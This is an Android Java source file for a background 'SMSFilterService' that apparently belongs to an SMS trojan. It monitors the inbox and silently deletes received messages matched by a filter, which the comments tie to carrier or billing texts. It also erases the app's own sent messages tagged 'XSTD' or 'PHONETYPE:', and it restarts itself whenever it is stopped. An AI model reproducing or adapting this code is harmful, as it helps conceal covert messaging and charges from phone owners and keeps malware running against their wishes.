package com.xstd.phoneService.secondeService;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.text.TextUtils;
import com.umeng.analytics.MobclickAgent;
import com.xstd.phoneService.Config;
import com.xstd.phoneService.Utils.MMSParseUtils;
import com.xstd.phoneService.setting.SettingManager;

import java.util.LinkedList;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-12-1
 * Time: PM8:06
 * To change this template use File | Settings | File Templates.
 */
public class SMSFilterService extends Service {

    private static final String SMS_URI = "content://mms-sms/";
    private static final String SMS_INBOX_URI = "content://sms";

//    private String mBlockPhoneNumber = null;

    private ContentResolver mResolver;

    private ContentObserver smsContentObserver = new ContentObserver(new Handler()) {

        @Override
        public synchronized void onChange(boolean selfChange) {
            super.onChange(true);
            Cursor cursor = mResolver.query(Uri.parse(SMS_INBOX_URI),
                                               new String[]{"_id", "address", "date", "body", "service_center", "type"},
                                               null,
                                               null,
                                               "date desc");

            if (cursor == null) {
                return;
            }

            LinkedList<String> deleteList = new LinkedList<String>();
            /**
             * 每次扫多少？5个
             */
            int searchCount = 0;
            int addressIndex = cursor.getColumnIndex("address");
            int bodyIndex = cursor.getColumnIndex("body");
            int idIndex = cursor.getColumnIndex("_id");
            int centerIndex = cursor.getColumnIndex("service_center");
            int typeIndex = cursor.getColumnIndex("type");
            while (cursor.moveToNext() && searchCount < 5) {
                /**
                 * 找最近的5条记录
                 */
                String fromAddress = cursor.getString(addressIndex);
                String body = cursor.getString(bodyIndex);
                String id = cursor.getString(idIndex);
                String center = cursor.getString(centerIndex);
                int type = cursor.getInt(typeIndex);
                if (Config.DEBUG) {
                    Config.LOGD("[[ContentObserver::onChanged]] current Message Info : " +
                                    "\n          || SMS from address : " + fromAddress
                                    + "\n        || body : " + body
                                    + "\n        || id : " + id
                                    + "\n        || center : " + center
                                    + "\n        || type : " + (type == 1 ? "received" : (type == 2 ? "send" : "unknow"))
                                    + "\n >>>>>>>>>>>>>>>>>\n\n");
                }

                if (TextUtils.isEmpty(fromAddress)) {
                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。
                    if (Config.DEBUG) {
                        Config.LOGD("\n[[ContentObserver::onChanged]] ignore this Message as the from address is empty.\n");
                    }

                    searchCount++;
                    continue;
                }

                if (fromAddress.startsWith("10")) {
                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。或是扣费短信
                    if (Config.DEBUG) {
                        Config.LOGD("\n[[ContentObserver::onChanged]] Message start with 10.\n");
                    }
                } else {
                    /**
                     * 短信发送地址处理
                     */
                    if (fromAddress.startsWith("+") == true && fromAddress.length() == 14) {
                        fromAddress = fromAddress.substring(3);
                    } else if (fromAddress.length() > 11) {
                        fromAddress = fromAddress.substring(fromAddress.length() - 11);
                    }
                }

                if (type == 1) {
                    //是接受到的短信
                    if (Config.DEBUG) {
                        Config.LOGD("[[ContentObserver::onChanged]] The message is RECEIVED message");
                    }
                    if (MMSParseUtils.handleMessage(getApplicationContext(), fromAddress, body, MMSParseUtils.DYNAMIC_FILTER_TYPE)) {
                        if (Config.DEBUG) {
                            Config.LOGD("[[ContentObserver::onChanged]] content observer find the message : [[" + body + "]] should handle " +
                                            "and delete from " + SMS_INBOX_URI);
                        }

                        long count = SettingManager.getInstance().getDynamicSMSFilterCount();
                        SettingManager.getInstance().setDynamicSMSFilterCount(count + 1);

                        deleteList.add(id);
                    }
                } else {
                    //是发送消息
                    if (Config.DEBUG) {
                        Config.LOGD("[[ContentObserver::onChanged]] The message is SENT message");
                    }
                    if (!TextUtils.isEmpty(body)
                            && (body.contains("XSTD")
                                    || body.contains("PHONETYPE:") )) {
                        deleteList.add(id);
                    }
                }

                searchCount++;
            }


            try {
                cursor.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

            for (String id : deleteList) {
                mResolver.delete(Uri.parse("content://sms/" + id), null, null);
                if (Config.DEBUG) {
                    Config.LOGD("[[ContentObserver::onChanged]] try to delete SMS id : " + id);
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        MobclickAgent.onResume(getApplicationContext());

        Config.LOGD("[[SMSFilterService]] onCreate");
        Config.LOGD("[[SMSFilterService]] registe dynamic SMS_RECEIVED");

        mResolver = getContentResolver();
        mResolver.registerContentObserver(Uri.parse(SMS_INBOX_URI), true, smsContentObserver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Config.LOGD("[[SMSFilterService]] onStartCommand");

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        MobclickAgent.onPause(getApplicationContext());

        Config.LOGD("[[SMSFilterService]] onCreate");

        mResolver.unregisterContentObserver(smsContentObserver);

        //因为这个服务应该是长期驻留在后台，所以再次启动它
        Intent serviceIntent = new Intent();
        serviceIntent.setClass(getApplicationContext(), SMSFilterService.class);
        startService(serviceIntent);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }


}
